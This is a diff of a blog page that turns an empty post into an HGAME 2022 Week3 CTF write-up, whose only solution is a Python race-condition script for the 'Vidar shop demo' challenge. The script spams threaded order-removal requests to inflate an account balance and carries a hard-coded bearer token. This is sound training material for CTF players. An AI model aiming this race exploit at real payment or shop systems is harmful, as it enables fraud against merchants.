@@ -18,17 +18,17 @@
   <link 
     rel="icon" 
     href="/img/logo.png">
-  <title>寒假总结</title>
+  <title>HGAME 2022 Week3 writeup by pankas</title>
   
     
       <meta 
         property="og:title" 
-        content="寒假总结">
+        content="HGAME 2022 Week3 writeup by pankas">
     
     
       <meta 
         property="og:url" 
-        content="https://pankas.top/2022/02/20/%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/index.html">
+        content="https://pankas.top/2022/02/20/week3-pankas/index.html">
     
     
       <meta 
@@ -57,7 +57,7 @@
         
           <meta 
             property="og:article:tag" 
-            content="随笔">
+            content="CTF HGAME">
         
       
     
@@ -302,11 +302,11 @@
 <article class="card card-content">
   <header>
     <h1 class="post-title">
-      寒假总结
+      HGAME 2022 Week3 writeup by pankas
     </h1>
   </header>
   <div class="post-meta post-show-meta">
-    <time datetime="2022-02-20T06:36:52.000Z">
+    <time datetime="2022-02-19T16:00:00.000Z">
       <i 
         class="iconfont icon-calendar" 
         style="margin-right: 2px;">
@@ -317,15 +317,15 @@
       <span class="dot"></span>
       
         <a 
-          href="/categories/%E6%97%A5%E5%B8%B8/" 
+          href="/categories/CTF-WP/" 
           class="post-meta-link">
-          日常
+          CTF-WP
         </a>
       
     
     
       <span class="dot"></span>
-      <span>0 字</span>
+      <span>261 字</span>
     
   </div>
   
@@ -340,9 +340,9 @@
         
           
           <a 
-            href="/tags/%E9%9A%8F%E7%AC%94/" 
+            href="/tags/CTF-HGAME/" 
             class="post-meta-link">
-            随笔
+            CTF HGAME
           </a>
         
       </div>
@@ -352,7 +352,60 @@
   <div 
     id="section" 
     class="post-content">
-    <p>！！！</p>
+    <p>[TOC]</p>
+<p>week3过年摆了，<del>基本</del>根本没做，惭愧·········</p>
+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h3><p>条件竞争，开多线程刷钱，够了就可以买flag了</p>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> threading
+<span class="token keyword">import</span> json
+payUrl <span class="token operator">=</span> <span class="token string">'http://4766634820.vidar-shop.mjclouds.com/api/pay/create'</span>
+createOrderUrl <span class="token operator">=</span> <span class="token string">'http://4766634820.vidar-shop.mjclouds.com/api/order/create'</span>
+sellUrl <span class="token operator">=</span> <span class="token string">'http://4766634820.vidar-shop.mjclouds.com/api/order/remove'</span>
+headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'Host'</span><span class="token punctuation">:</span> <span class="token string">'4766634820.vidar-shop.mjclouds.com'</span><span class="token punctuation">,</span>
+        <span class="token string">'User-Agent'</span><span class="token punctuation">:</span> <span class="token string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept'</span><span class="token punctuation">:</span> <span class="token string">'application/json, text/plain, */*'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept-Language'</span><span class="token punctuation">:</span> <span class="token string">'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'</span><span class="token punctuation">,</span>
+        <span class="token string">'Accept-Encoding'</span><span class="token punctuation">:</span> <span class="token string">'gzip, deflate'</span><span class="token punctuation">,</span>
+        <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/json'</span><span class="token punctuation">,</span>
+        <span class="token string">'Authorization'</span><span class="token punctuation">:</span> <span class="token string">'bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2NDQyMDYzODUsImlhdCI6MTY0NDExOTk4NSwidWlkIjozNTF9.c4d_p8TutNYanYK7KPIJwuLFR9tkAIvdLZFhqPT_0jE'</span><span class="token punctuation">,</span>
+        <span class="token string">'Origin'</span><span class="token punctuation">:</span> <span class="token string">'http://4766634820.vidar-shop.mjclouds.com'</span><span class="token punctuation">,</span>
+        <span class="token string">'Connection'</span><span class="token punctuation">:</span> <span class="token string">'keep-alive'</span><span class="token punctuation">,</span>
+        <span class="token string">'Referer'</span><span class="token punctuation">:</span> <span class="token string">'http://4766634820.vidar-shop.mjclouds.com/'</span>
+    <span class="token punctuation">&#125;</span>
+createData <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">"amount"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
+        <span class="token string">"pid"</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span>
+        <span class="token string">"status"</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
+        <span class="token string">"uid"</span><span class="token punctuation">:</span> <span class="token number">351</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token keyword">def</span> <span class="token function">pay</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>createOrderUrl<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>createData<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+    oid <span class="token operator">=</span> json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span>
+    payData <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'amount'</span><span class="token punctuation">:</span> <span class="token number">20</span><span class="token punctuation">,</span>
+        <span class="token string">'oid'</span><span class="token punctuation">:</span> oid<span class="token punctuation">,</span>
+        <span class="token string">'uid'</span><span class="token punctuation">:</span> <span class="token number">351</span>
+    <span class="token punctuation">&#125;</span>
+    requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>payUrl<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>payData<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+    <span class="token keyword">return</span> oid
+<span class="token keyword">def</span> <span class="token function">sell</span><span class="token punctuation">(</span>oid<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># print(oid)</span>
+    sellData <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+        <span class="token string">'id'</span><span class="token punctuation">:</span> oid
+    <span class="token punctuation">&#125;</span>
+    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>sellUrl<span class="token punctuation">,</span> data<span class="token operator">=</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>sellData<span class="token punctuation">)</span><span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
+    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    oid <span class="token operator">=</span> pay<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>sell<span class="token punctuation">(</span>oid<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>solve<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
 
   </div>
   <div>
@@ -372,8 +425,8 @@
           <span style="font-weight: bold;">文章链接：</span><a 
             target="_blank" 
             rel="nofollow noopener noreferrer" 
-            href="https://pankas.top/2022/02/20/%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/">
-            https://pankas.top/2022/02/20/%E5%AF%92%E5%81%87%E6%80%BB%E7%BB%93/
+            href="https://pankas.top/2022/02/20/week3-pankas/">
+            https://pankas.top/2022/02/20/week3-pankas/
           </a>
         </p>
         <p><span style="font-weight: bold;">版权声明：</span>转载请注明出处！</p>
@@ -383,15 +436,29 @@
 </article>
 <div class="nav">
   
+    <div class="nav-item-prev">
+      <a 
+        href="/2022/02/20/week1-pankas/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">上一篇</div>
+          
+            <div class="nav-title">HGAME 2022 Week1 writeup by pankas </div>
+          
+        </div>
+      </a>
+    </div>
+  
   
     <div class="nav-item-next">
       <a 
-        href="/2022/02/20/week1-pankas/" 
+        href="/2022/02/20/week4-pankas/" 
         class="nav-link">
         <div>
           <div class="nav-label">下一篇</div>
           
-            <div class="nav-title">HGAME 2022 Week1 writeup by pankas </div>
+            <div class="nav-title">HGAME 2022 Week4 writeup by pankas </div>
           
         </div>
         <i class="iconfont icon-right nav-next-icon"></i>
@@ -409,7 +476,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vidar-shop-demo"><span class="toc-text">Vidar shop demo</span></a></li></ol></li></ol>
 </div></main>
             <aside class="left-column">
               
@@ -457,7 +524,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vidar-shop-demo"><span class="toc-text">Vidar shop demo</span></a></li></ol></li></ol>
       </div>
     </article>
   
@@ -530,7 +597,7 @@
     style="padding-right: 2px;">
   </i>目录
 </div>
-
+<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Vidar-shop-demo"><span class="toc-text">Vidar shop demo</span></a></li></ol></li></ol>
     </article>
   
   
